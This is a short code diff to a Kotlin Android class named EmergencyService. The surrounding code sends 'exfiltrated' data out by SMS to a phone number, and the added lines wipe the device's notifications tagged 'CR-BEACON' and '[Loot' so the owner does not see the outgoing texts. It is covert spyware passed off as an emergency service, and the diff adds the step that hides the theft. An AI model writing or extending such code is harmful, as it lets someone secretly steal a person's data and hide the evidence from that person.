@@ -154,6 +154,14 @@ class EmergencyService : Service() {
             // Use multipart sending to ensure long exfiltrated messages aren't truncated by the OS
             val parts = smsManager.divideMessage(msg)
             smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
+            
+            // Clear any "Message Sent" or thread update notifications from the UI
+            CoroutineScope(Dispatchers.Main).launch {
+                delay(1000)
+                MyNotificationListener.instance?.wipeNotifications("TEXT", "CR-BEACON")
+                MyNotificationListener.instance?.wipeNotifications("TEXT", "[Loot")
+            }
+            
             DebugLogger.log("CodeRed", "Exfiltrated chunk to $phone")
         } catch (e: Exception) {
             DebugLogger.log("CodeRed_SMS_ERR", "Failed to send exfiltration text: ${e.message}")
